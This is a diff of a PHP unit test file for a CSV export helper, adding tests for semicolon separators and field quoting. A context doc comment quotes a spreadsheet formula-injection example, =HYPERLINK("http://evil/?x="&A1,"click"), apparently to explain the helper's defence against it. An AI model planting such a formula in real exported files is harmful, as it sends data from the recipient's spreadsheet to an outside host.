@@ -33,6 +33,23 @@ final class CsvTest extends TestCase
         self::assertStringContainsString("\"first\nsecond\"", $body);
     }
 
+    public function testASemicolonSeparatorSplitsOnSemicolonsAndQuotesThem(): void
+    {
+        $body = Csv::fromRows(['date', 'note'], [['2026-10-04', 'one; two, three']], ';');
+
+        self::assertStringStartsWith(Csv::BOM, $body);
+        self::assertStringContainsString("date;note\n", $body);
+        self::assertStringContainsString('2026-10-04;"one; two, three"', $body);
+    }
+
+    public function testACommaSeparatedFileLeavesSemicolonsUnquoted(): void
+    {
+        // No space in the value: fputcsv quotes any field containing one.
+        $body = Csv::fromRows(['note'], [['one;two']]);
+
+        self::assertStringContainsString("one;two\n", $body);
+    }
+
     /**
      * =HYPERLINK("http://evil/?x="&A1,"click") in a note field runs when the
      * file is opened. The note is typed by a user and the display name comes
